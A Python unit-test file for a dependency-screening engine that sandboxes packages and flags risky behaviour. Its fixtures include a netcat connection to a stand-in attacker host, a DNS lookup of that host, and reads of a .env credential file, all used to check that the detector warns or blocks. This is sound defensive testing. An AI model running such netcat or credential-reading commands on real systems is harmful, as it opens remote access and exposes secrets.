"""Unit tests for the screening engine. No Docker needed: these cover pure logic."""
import json
import sys
import tempfile
import unittest
from pathlib import Path

PROJECT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT / "scripts"))

from screening import dynamic, report  # noqa: E402
from screening.detect import detect_ecosystems  # noqa: E402
from screening.models import Report  # noqa: E402
from screening.runner import ToolCall, docker_command  # noqa: E402


class ReportTests(unittest.TestCase):
    def test_md_escapes_pipes_backticks_and_newlines(self):
        self.assertEqual(report.md("a|b`c\nd"), "a\\|b'c d")

    def test_untrusted_pipe_in_package_name_cannot_break_table(self):
        r = Report(target="x", ecosystems={"npm": ["package.json"]})
        r.cover("npm", "heuristics", "no risks detected")
        r.add("warn", "static", "evil|pkg `injected`")
        text = report.render(r, "now")
        finding = [ln for ln in text.splitlines() if "evil" in ln][0]
        self.assertIn("evil\\|pkg 'injected'", finding)

    def test_tool_note_fence_survives_backticks_inside(self):
        r = Report(target="x", ecosystems={})
        r.tool_notes.append("output with ``` inside")
        text = report.render(r, "now")
        self.assertIn("````\noutput with ``` inside\n````", text)


class DynamicParsingTests(unittest.TestCase):
    def test_parses_exit_events_and_counts_malformed_lines(self):
        out = ("::PIP_EXIT::0\n::EVENTS_BEGIN::\n"
               '{"kind": "dns_lookup", "host": "evil.example.test"}\n'
               "not json\n"
               "::EVENTS_END::\n")
        pip, events, malformed, has_markers = dynamic.parse_output(out)
        self.assertEqual(pip, 0)
        self.assertEqual(len(events), 1)
        self.assertEqual(malformed, 1)
        self.assertTrue(has_markers)

    def test_missing_markers_are_reported(self):
        _, events, _, has_markers = dynamic.parse_output("sandbox crashed")
        self.assertFalse(has_markers)
        self.assertEqual(events, [])

    def test_network_and_credential_events_block(self):
        verdicts = dynamic.judge_events([
            {"kind": "network_connect", "address": "('1.2.3.4', 80)"},
            {"kind": "sensitive_file_access", "path": "/home/sandbox/.env"},
        ])
        self.assertEqual([sev for sev, _ in verdicts], ["block", "block"])

    def test_routine_spawn_is_not_flagged_but_unknown_spawn_warns(self):
        verdicts = dynamic.judge_events([
            {"kind": "process_spawn", "args": "uname -m"},
            {"kind": "process_spawn", "args": "/bin/nc evil.example.test 4444"},
        ])
        self.assertEqual(len(verdicts), 1)
        self.assertEqual(verdicts[0][0], "warn")


class DetectionTests(unittest.TestCase):
    def test_symlinked_manifest_is_ignored(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "real").mkdir()
            (root / "real" / "requirements.txt").write_text("requests==2.31.0\n")
            outside = Path(tmp).parent / "outside-requirements.txt"
            (root / "requirements.txt").symlink_to(outside)
            found = detect_ecosystems(root)
        self.assertEqual(found, {"pypi": ["real/requirements.txt"]})


class RunnerTests(unittest.TestCase):
    def test_toolbox_guarddog_runs_without_network(self):
        cmd = docker_command(ToolCall("guarddog", ("npm", "scan", "{target}"), False),
                             Path("/tmp/pkg"))
        self.assertIn("--network", cmd)
        self.assertEqual(cmd[cmd.index("--network") + 1], "none")

    def test_toolbox_osv_scanner_keeps_network(self):
        cmd = docker_command(ToolCall("osv-scanner", ("scan",), True), Path("/tmp/pkg"))
        self.assertNotIn("--network", cmd)

    def test_target_is_mounted_read_only_with_mount_syntax(self):
        cmd = docker_command(ToolCall("guarddog", ("go", "scan", "{target}"), False),
                             Path("/tmp/my:pkg"))
        mount = cmd[cmd.index("--mount") + 1]
        self.assertEqual(mount, "type=bind,source=/tmp/my:pkg,target=/target,readonly")
        self.assertIn("/target", cmd)


if __name__ == "__main__":
    unittest.main()
